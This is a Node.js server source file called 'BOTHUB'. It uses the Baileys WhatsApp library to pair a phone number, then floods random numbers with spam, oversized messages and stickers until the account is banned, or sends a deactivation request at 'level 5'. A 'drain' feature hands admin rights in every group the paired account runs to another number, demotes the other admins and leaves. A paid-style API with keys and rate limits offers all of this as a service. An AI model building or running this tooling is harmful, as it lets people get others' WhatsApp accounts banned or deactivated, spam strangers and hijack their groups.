// BOTHUB — pairing site + level runner + drain + deactivate + admin + public pairing API.

import express from 'express';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';
import pino from 'pino';
import makeWASocket, {
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  DisconnectReason,
  Browsers,
} from '@whiskeysockets/baileys';
import { deactivate } from './utils/deactivate.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PORT = process.env.PORT || 3000;
const AUTH_DIR = process.env.AUTH_DIR || './auth';
const DATA_DIR = process.env.DATA_DIR || './data';
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || null;
const BIG = 'x'.repeat(60000);

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ── Session helpers ────────────────────────────────────────────────────
function sessionDir(phone) { return path.join(AUTH_DIR, phone); }

function purgeAuthDir(phone) {
  const dir = sessionDir(phone);
  try {
    if (fs.existsSync(dir)) {
      fs.rmSync(dir, { recursive: true, force: true });
      console.log(`[purge] removed ${dir}`);
    }
  } catch (err) {
    console.warn(`[purge] failed to remove ${dir}:`, err?.message || err);
  }
}

function disconnectSession(phone) {
  const sess = sessions.get(phone);
  if (sess?.sock) {
    try { sess.sock.ev.removeAllListeners(); } catch {}
    try { sess.sock.end(undefined); } catch {}
  }
  sessions.delete(phone);
  purgeAuthDir(phone);
}

// ── API keys ───────────────────────────────────────────────────────────
const KEYS_FILE = path.join(DATA_DIR, 'apikeys.json');

function loadKeys() {
  try {
    if (!fs.existsSync(KEYS_FILE)) return [];
    return JSON.parse(fs.readFileSync(KEYS_FILE, 'utf8'));
  } catch { return []; }
}

function saveKeys(keys) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
  fs.writeFileSync(KEYS_FILE, JSON.stringify(keys, null, 2));
}

function generateKey() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const bytes = crypto.randomBytes(32);
  let s = '';
  for (let i = 0; i < 32; i++) s += chars[bytes[i] % 62];
  return 'bh-' + s;
}

function createKey(label) {
  const keys = loadKeys();
  const entry = {
    key: generateKey(),
    label: String(label || 'default').slice(0, 64),
    created: new Date().toISOString(),
    lastUsed: null,
    uses: 0,
    revoked: false,
  };
  keys.push(entry);
  saveKeys(keys);
  return entry;
}

function findKey(k) {
  return loadKeys().find((e) => e.key === k);
}

function touchKey(k) {
  const keys = loadKeys();
  const entry = keys.find((e) => e.key === k);
  if (entry) {
    entry.lastUsed = new Date().toISOString();
    entry.uses = (entry.uses || 0) + 1;
    saveKeys(keys);
  }
}

function revokeKey(k) {
  const keys = loadKeys();
  const entry = keys.find((e) => e.key === k);
  if (!entry) return false;
  entry.revoked = true;
  saveKeys(keys);
  return true;
}

function requireApiKey(req, res, next) {
  const header = String(req.headers.authorization || '');
  const m = header.match(/^Bearer\s+(bh-[A-Za-z0-9]+)$/i);
  const fromQuery = String(req.query?.key ?? '');
  const token = m ? m[1] : fromQuery;
  if (!token) return res.status(401).json({ error: 'missing_api_key' });
  const entry = findKey(token);
  if (!entry) return res.status(401).json({ error: 'invalid_api_key' });
  if (entry.revoked) return res.status(401).json({ error: 'revoked_api_key' });
  req.apiKey = entry;
  next();
}

function adminAuthed(req) {
  if (!ADMIN_TOKEN) return false;
  const t = req.query?.token || req.body?.token;
  return t === ADMIN_TOKEN;
}

// ── Level sessions ─────────────────────────────────────────────────────
const sessions = new Map();

function randomJid() {
  const d = String(Math.floor(Math.random() * 9e11) + 1e11);
  return `${d}@s.whatsapp.net`;
}

function tick(sess) {
  sess.sends++;
  if (sess.sends % 500 === 0) {
    const s = (Date.now() - sess.startedAt) / 1000;
    console.log(`[${sess.phone}] sent ${sess.sends} | ${(sess.sends / s).toFixed(0)}/s`);
  }
}

async function flood(sess) {
  while (true) {
    try { await sess.sock.sendMessage(randomJid(), { text: 'x' }); } catch {}
    tick(sess);
  }
}

async function stickerLoop(sess) {
  const p = path.join(__dirname, 'assets', 'sticker.png');
  if (!fs.existsSync(p)) return;
  const buf = fs.readFileSync(p);
  while (true) {
    try { await sess.sock.sendMessage(randomJid(), { sticker: buf }); } catch {}
    tick(sess);
  }
}

async function bigLoop(sess) {
  while (true) {
    try { await sess.sock.sendMessage(randomJid(), { text: BIG }); } catch {}
    tick(sess);
  }
}

async function runLevel(sess) {
  sess.startedAt = Date.now();
  sess.sends = 0;
  const level = sess.level;
  console.log(`[${sess.phone}] level ${level} starting (key=${sess.key || 'web'})`);

  if (level === 5) {
    try {
      console.log(`[${sess.phone}] requesting deactivation`);
      const r = await deactivate(sess.sock, { logger: console });
      console.log(`[${sess.phone}] deactivate response:`, JSON.stringify(r));
    } catch (err) {
      console.warn(`[${sess.phone}] deactivate failed:`, err?.message || err);
    }
    return;
  }

  if (level === 1 || level === 2) return flood(sess);
  if (level === 3) { stickerLoop(sess); return flood(sess); }
  if (level === 4) { stickerLoop(sess); bigLoop(sess); return flood(sess); }
}

async function startPairing(phone, level, key = null) {
  const existing = sessions.get(phone);
  if (existing?.sock) {
    try { existing.sock.end(undefined); } catch {}
    sessions.delete(phone);
  }

  fs.mkdirSync(sessionDir(phone), { recursive: true });
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir(phone));

  let version;
  try { ({ version } = await fetchLatestBaileysVersion()); } catch { version = undefined; }

  const sock = makeWASocket({
    ...(version ? { version } : {}),
    auth: state,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    browser: Browsers.ubuntu('Chrome'),
    markOnlineOnConnect: false,
    syncFullHistory: false,
    shouldSyncHistoryMessage: () => false,
  });

  const sess = {
    phone, level, sock, key,
    status: 'pending',
    code: null,
    sends: 0,
    startedAt: 0,
    bannedAt: null,
    createdAt: new Date().toISOString(),
  };
  sessions.set(phone, sess);

  sock.ev.on('creds.update', saveCreds);

  let resolveCode;
  const codePromise = new Promise((res) => { resolveCode = res; });
  let pairingRequested = false;

  sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
    if (qr && !pairingRequested && !sock.authState.creds.registered) {
      pairingRequested = true;
      try {
        const raw = await sock.requestPairingCode(phone);
        const code = raw?.match(/.{1,4}/g)?.join('-') || raw;
        sess.code = code;
        resolveCode(code);
        console.log(`[${phone}] pairing code: ${code}`);
      } catch (err) {
        pairingRequested = false;
        console.error(`[${phone}] pairing attempt failed, will retry:`, err?.message || err);
      }
    }

    if (connection === 'open') {
      sess.status = 'connected';
      console.log(`[${phone}] connected as ${sock.user?.id}`);
      runLevel(sess);
    }

    if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode;
      const ts = new Date().toISOString();
      fs.mkdirSync(path.join(__dirname, 'logs'), { recursive: true });
      fs.appendFileSync(
        path.join(__dirname, 'logs', 'session.log'),
        `[${ts}] ${phone} close code=${code}\n`
      );

      if (code === 401 || code === 403) {
        sess.status = 'banned';
        sess.bannedAt = ts;
        sess.sock = null;
        fs.appendFileSync(
          path.join(__dirname, 'logs', 'session.log'),
          `[${ts}] ${phone} *** BANNED ***\n`
        );
        console.log(`[${phone}] *** BANNED at ${ts} *** — purging auth dir`);
        purgeAuthDir(phone);
        return;
      }

      console.log(`[${phone}] close code=${code}, reconnecting`);
      setTimeout(() => {
        const s = sessions.get(phone);
        if (!s || s.status === 'banned') return;
        startPairing(phone, level, key);
      }, 3000);
    }
  });

  if (!sock.authState.creds.registered) {
    const timeout = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('pairing timeout — no qr event in 25s')), 25000)
    );
    const code = await Promise.race([codePromise, timeout]);
    return { code };
  }

  return { code: null, alreadyRegistered: true };
}

// ── Web pairing endpoint (own site) ────────────────────────────────────
app.post('/api/pair/start', async (req, res) => {
  const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
  const level = parseInt(req.body?.level, 10);
  if (!phone) return res.status(400).json({ error: 'phone required' });
  if (![1, 2, 3, 4, 5].includes(level)) return res.status(400).json({ error: 'level 1-5 required' });
  try {
    const { code, alreadyRegistered } = await startPairing(phone, level, null);
    res.json({ phone, level, code: code || null, alreadyRegistered: !!alreadyRegistered });
  } catch (err) {
    console.error('[pair/start]', err?.message || err);
    res.status(500).json({ error: err?.message || 'pairing failed' });
  }
});

app.get('/api/pair/status', (req, res) => {
  const phone = String(req.query?.phone ?? '').replace(/\D/g, '');
  const s = sessions.get(phone);
  if (!s) return res.json({ status: 'expired' });
  res.json({ status: s.status, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt });
});

// ── Public pairing API (v1) ────────────────────────────────────────────
app.post('/api/v1/sessions', requireApiKey, async (req, res) => {
  const phone = String(req.body?.number ?? '').replace(/\D/g, '');
  const level = parseInt(req.body?.level, 10);
  if (!phone) return res.status(400).json({ error: 'number_required' });
  if (![1, 2, 3, 4, 5].includes(level)) return res.status(400).json({ error: 'level_1_5_required' });

  const key = req.apiKey.key;
  const mine = [...sessions.values()].filter((s) => s.key === key);
  const active = mine.filter((s) => s.status !== 'banned');
  if (active.length >= 3) return res.status(429).json({ error: 'too_many_active_sessions' });
  const now = Date.now();
  const recent = mine.filter((s) => s.createdAt && now - new Date(s.createdAt).getTime() < 3600e3);
  if (recent.length >= 20) return res.status(429).json({ error: 'rate_limit_exceeded' });

  try {
    const { code } = await startPairing(phone, level, key);
    touchKey(key);
    res.status(201).json({ number: phone, level, code, expiresIn: 60 });
  } catch (err) {
    console.error('[api/v1/sessions]', err?.message || err);
    res.status(500).json({ error: err?.message || 'pairing_failed' });
  }
});

app.get('/api/v1/sessions/:number', requireApiKey, (req, res) => {
  const phone = String(req.params.number || '').replace(/\D/g, '');
  const s = sessions.get(phone);
  if (!s) return res.status(404).json({ error: 'session_not_found' });
  if (s.key && s.key !== req.apiKey.key) return res.status(403).json({ error: 'not_your_session' });
  res.json({
    number: s.phone,
    level: s.level,
    status: s.status,
    sends: s.sends,
    startedAt: s.startedAt,
    bannedAt: s.bannedAt,
  });
});

app.delete('/api/v1/sessions/:number', requireApiKey, (req, res) => {
  const phone = String(req.params.number || '').replace(/\D/g, '');
  const s = sessions.get(phone);
  if (!s) return res.status(404).json({ error: 'session_not_found' });
  if (s.key && s.key !== req.apiKey.key) return res.status(403).json({ error: 'not_your_session' });
  disconnectSession(phone);
  res.json({ ok: true });
});

// ── Panel (API key management) ─────────────────────────────────────────
app.get('/api/panel/keys', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  const keys = loadKeys().map((k) => ({
    prefix: k.key.slice(0, 12) + '…',
    label: k.label,
    created: k.created,
    lastUsed: k.lastUsed,
    uses: k.uses,
    revoked: k.revoked,
    key: k.key, // panel is admin-gated, so full key is fine here
  }));
  res.json(keys);
});

app.post('/api/panel/keys', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  const label = String(req.body?.label ?? 'default').slice(0, 64);
  const k = createKey(label);
  res.status(201).json(k);
});

app.post('/api/panel/keys/revoke', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  const key = String(req.body?.key ?? '');
  if (!key) return res.status(400).json({ error: 'key_required' });
  const ok = revokeKey(key);
  res.json({ ok });
});

// ── Admin panel (sessions) ─────────────────────────────────────────────
app.get('/api/admin/sessions', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  const out = [];
  for (const [phone, s] of sessions.entries()) {
    out.push({
      phone, level: s.level, status: s.status, sends: s.sends,
      startedAt: s.startedAt, bannedAt: s.bannedAt, key: s.key || null,
    });
  }
  res.json(out);
});

app.get('/api/admin/drains', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  const out = [];
  for (const [id, d] of drains.entries()) {
    out.push({
      id, destJid: d.destJid, sourcePhone: d.sourcePhone,
      status: d.status, total: d.total, done: d.done, errors: d.errors,
    });
  }
  res.json(out);
});

app.post('/api/admin/disconnect', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
  if (!phone) return res.status(400).json({ error: 'phone required' });
  disconnectSession(phone);
  res.json({ ok: true });
});

// ── Function 5 — group migration ───────────────────────────────────────
const drains = new Map();

async function runDrain(drain, sock, sessionId) {
  drain.status = 'running';
  const myJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
  const myDigits = myJid.split('@')[0];
  const destJid = drain.destJid;

  let groups;
  try { groups = await sock.groupFetchAllParticipating(); }
  catch (err) {
    drain.status = 'error';
    drain.errors.push(`groupFetchAllParticipating: ${err?.message || err}`);
    return;
  }

  const jids = Object.keys(groups || {});
  drain.total = jids.length;
  drain.done = 0;

  for (const jid of jids) {
    try {
      const meta = groups[jid];
      const meP = (meta.participants || []).find((p) =>
        p.id === myJid || p.id?.split(':')[0] === myDigits
      );
      if (!meP || !meP.admin) { drain.done++; continue; }

      if (!(meta.participants || []).some((p) => p.id === destJid)) {
        await sock.groupParticipantsUpdate(jid, [destJid], 'add');
        await sleep(1200);
      }
      await sock.groupParticipantsUpdate(jid, [destJid], 'promote');
      await sleep(1200);
      const toDemote = (meta.participants || [])
        .filter((p) => p.admin && p.id !== destJid && p.id !== myJid)
        .map((p) => p.id);
      if (toDemote.length) {
        await sock.groupParticipantsUpdate(jid, toDemote, 'demote');
        await sleep(1200);
      }
      await sock.groupLeave(jid);
      await sleep(1500);
      drain.done++;
    } catch (err) {
      drain.errors.push(`${jid}: ${err?.message || err}`);
      drain.done++;
    }
  }
  drain.status = 'done';
}

app.post('/api/drain/start', (req, res) => {
  const dest = String(req.body?.dest ?? '').replace(/\D/g, '');
  if (!dest) return res.status(400).json({ error: 'destination number required' });
  const id = crypto.randomBytes(6).toString('hex');
  drains.set(id, {
    destJid: `${dest}@s.whatsapp.net`,
    sourcePhone: null, sourceSock: null,
    status: 'awaiting_source', total: 0, done: 0, errors: [],
  });
  res.json({ sessionId: id, link: `/drain/${id}` });
});

app.post('/api/drain/source', async (req, res) => {
  const { sessionId } = req.body || {};
  const source = String(req.body?.source ?? '').replace(/\D/g, '');
  if (!sessionId || !drains.has(sessionId)) return res.status(400).json({ error: 'unknown session' });
  if (!source) return res.status(400).json({ error: 'source number required' });

  const drain = drains.get(sessionId);
  const phone = source;
  drain.sourcePhone = phone;

  fs.mkdirSync(sessionDir(phone), { recursive: true });
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir(phone));
  let version;
  try { ({ version } = await fetchLatestBaileysVersion()); } catch { version = undefined; }

  const sock = makeWASocket({
    ...(version ? { version } : {}),
    auth: state,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    browser: Browsers.ubuntu('Chrome'),
    markOnlineOnConnect: false,
    syncFullHistory: false,
    shouldSyncHistoryMessage: () => false,
  });
  sock.ev.on('creds.update', saveCreds);
  drain.sourceSock = sock;

  let resolveCode;
  const codePromise = new Promise((res) => { resolveCode = res; });
  let pairingRequested = false;

  sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
    if (qr && !pairingRequested && !sock.authState.creds.registered) {
      pairingRequested = true;
      try {
        const raw = await sock.requestPairingCode(phone);
        const code = raw?.match(/.{1,4}/g)?.join('-') || raw;
        resolveCode(code);
        console.log(`[drain ${sessionId}] source pairing code: ${code}`);
      } catch (err) {
        pairingRequested = false;
      }
    }
    if (connection === 'open') {
      console.log(`[drain ${sessionId}] source connected`);
      runDrain(drain, sock, sessionId).catch((err) => {
        drain.status = 'error';
        drain.errors.push(String(err?.message || err));
      });
    }
    if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code === 401 || code === 403) { drain.status = 'banned'; purgeAuthDir(phone); }
    }
  });

  if (!sock.authState.creds.registered) {
    const timeout = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('pairing timeout')), 25000)
    );
    try { res.json({ code: await Promise.race([codePromise, timeout]) }); }
    catch (err) { res.status(500).json({ error: err?.message || 'pairing failed' }); }
  } else {
    res.json({ code: null, alreadyRegistered: true });
    runDrain(drain, sock, sessionId).catch(() => {});
  }
});

app.get('/api/drain/status', (req, res) => {
  const id = String(req.query?.sessionId ?? '');
  const d = drains.get(id);
  if (!d) return res.status(404).json({ error: 'unknown session' });
  res.json({ status: d.status, total: d.total, done: d.done, errors: d.errors });
});

// ── Static pages ───────────────────────────────────────────────────────
app.get(['/drain', '/drain/:id'], (req, res) => res.sendFile(path.join(__dirname, 'public', 'drain.html')));
app.get('/docs', (req, res) => res.sendFile(path.join(__dirname, 'public', 'docs.html')));

app.get(['/admin', '/admin/'], (req, res) => {
  if (!ADMIN_TOKEN || req.query?.token !== ADMIN_TOKEN) return res.status(404).end();
  res.sendFile(path.join(__dirname, 'admin.html'));
});
app.get(['/panel', '/panel/'], (req, res) => {
  if (!ADMIN_TOKEN || req.query?.token !== ADMIN_TOKEN) return res.status(404).end();
  res.sendFile(path.join(__dirname, 'panel.html'));
});

app.listen(PORT, () => {
  console.log(`[bothub] http://localhost:${PORT}`);
  console.log(`[bothub] admin ${ADMIN_TOKEN ? '/admin?token=***' : 'disabled'} · panel ${ADMIN_TOKEN ? '/panel?token=***' : 'disabled'}`);
});
